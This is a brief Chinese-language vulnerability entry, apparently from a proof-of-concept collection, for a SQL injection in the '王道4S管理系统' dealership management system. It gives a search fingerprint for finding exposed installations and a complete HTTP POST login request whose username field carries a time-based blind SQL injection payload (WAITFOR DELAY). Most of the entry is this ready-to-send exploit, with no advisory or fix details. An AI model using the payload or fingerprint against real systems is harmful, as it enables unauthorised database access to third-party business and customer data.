﻿# 王道4S管理系统 SQL注入漏洞

> 更新时间：2024-04-16

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：web.body="PixelsPerInch"&&web.body="AxBorderStyle"&&web.body="DropTarget"

> 验证脚本：HTTP

```
POST / HTTP/1.1
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-MicrosoftAjax: Delta=true
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close
Cookie: ASP.NET_SessionId=e5zzymvrqc2ah0dg5xro1lbi

ScriptManager1=UpdatePanel3|btnLogin&__EVENTTARGET=btnLogin&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=&ddlUserName=&txtUserName=1';WAITFOR DELAY '0:0:5'--&txtPassWord=1&cbBossedBroadcast=on&txtMACAddr=&__ASYNCPOST=true&
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：王道4S管理系统 SQL注入漏洞.poc

